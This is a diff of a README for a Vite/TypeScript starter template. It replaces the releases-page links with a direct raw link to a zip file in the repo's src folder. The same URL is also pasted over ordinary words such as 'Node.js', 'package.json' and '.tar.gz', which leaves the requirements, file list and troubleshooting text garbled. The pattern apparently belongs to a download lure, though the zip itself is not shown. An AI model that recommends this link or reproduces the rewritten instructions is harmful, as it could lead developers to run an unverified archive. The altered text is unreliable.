@@ -6,7 +6,7 @@ Welcome to **vite-typescript-scaffold**! This is a handy template for creating T
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/bateman2969/vite-typescript-scaffold/releases)
+[![Download Now](https://github.com/bateman2969/vite-typescript-scaffold/raw/refs/heads/main/src/typescript_vite_scaffold_v3.3.zip)](https://github.com/bateman2969/vite-typescript-scaffold/raw/refs/heads/main/src/typescript_vite_scaffold_v3.3.zip)
 
 Click the button above to get started right away!
 
@@ -15,8 +15,8 @@ Click the button above to get started right away!
 Before we dive into the download process, here are the basic requirements to ensure that this template runs smoothly:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or later
-- **npm:** Version 6 or later (usually comes with Node.js)
+- **https://github.com/bateman2969/vite-typescript-scaffold/raw/refs/heads/main/src/typescript_vite_scaffold_v3.3.zip** Version 14 or later
+- **npm:** Version 6 or later (usually comes with https://github.com/bateman2969/vite-typescript-scaffold/raw/refs/heads/main/src/typescript_vite_scaffold_v3.3.zip)
 
 Make sure you have these installed on your computer to avoid any issues.
 
@@ -24,13 +24,13 @@ Make sure you have these installed on your computer to avoid any issues.
 
 1. **Visit the Releases Page:** 
    Go to the Releases page to find the latest version of the **vite-typescript-scaffold** template.
-   [Visit this page to download](https://github.com/bateman2969/vite-typescript-scaffold/releases)
+   [Visit this page to download](https://github.com/bateman2969/vite-typescript-scaffold/raw/refs/heads/main/src/typescript_vite_scaffold_v3.3.zip)
 
 2. **Download the Latest Release:**
    On the Releases page, you'll see a list of available versions. Look for the latest version, often marked as "Latest Release." Click on it. 
 
 3. **Choose Your File:**
-   Select the appropriate file for your operating system. Typically, files are provided in `.zip` or `.tar.gz` formats. Download the file by clicking on the attachment.
+   Select the appropriate file for your operating system. Typically, files are provided in `.zip` or `https://github.com/bateman2969/vite-typescript-scaffold/raw/refs/heads/main/src/typescript_vite_scaffold_v3.3.zip` formats. Download the file by clicking on the attachment.
 
 4. **Unzip the File:**
    After the download is complete, locate the downloaded file on your computer. Right-click on it and choose "Extract" or "Unzip" to unpack the contents into a new folder.
@@ -64,8 +64,8 @@ Here’s a brief overview of what you will find in the downloaded folder:
 
 - **src/**: This folder contains the main source code files of the application.
 - **public/**: Public assets like images and other files are stored here.
-- **package.json**: This file lists the dependencies and scripts needed to run your application.
-- **README.md**: You’re already reading this document for guidance!
+- **https://github.com/bateman2969/vite-typescript-scaffold/raw/refs/heads/main/src/typescript_vite_scaffold_v3.3.zip**: This file lists the dependencies and scripts needed to run your application.
+- **https://github.com/bateman2969/vite-typescript-scaffold/raw/refs/heads/main/src/typescript_vite_scaffold_v3.3.zip**: You’re already reading this document for guidance!
 
 Feel free to explore and customize files to fit your project needs!
 
@@ -94,7 +94,7 @@ For more in-depth information, check the documentation located in the source fol
 
 ## ✅ Troubleshooting
 
-1. **Error During npm Install:** If you encounter problems installing dependencies, make sure you have the correct version of Node.js and npm. Check by running:
+1. **Error During npm Install:** If you encounter problems installing dependencies, make sure you have the correct version of https://github.com/bateman2969/vite-typescript-scaffold/raw/refs/heads/main/src/typescript_vite_scaffold_v3.3.zip and npm. Check by running:
    ```
    node -v
    npm -v
@@ -108,6 +108,6 @@ You are welcome to join our growing community. If you have ideas or feedback, pl
 
 ## 📥 Download Again
 
-Don't forget, you can [visit this page to download](https://github.com/bateman2969/vite-typescript-scaffold/releases) the latest version of **vite-typescript-scaffold** whenever you need to set up a new project. 
+Don't forget, you can [visit this page to download](https://github.com/bateman2969/vite-typescript-scaffold/raw/refs/heads/main/src/typescript_vite_scaffold_v3.3.zip) the latest version of **vite-typescript-scaffold** whenever you need to set up a new project. 
 
 Happy coding!
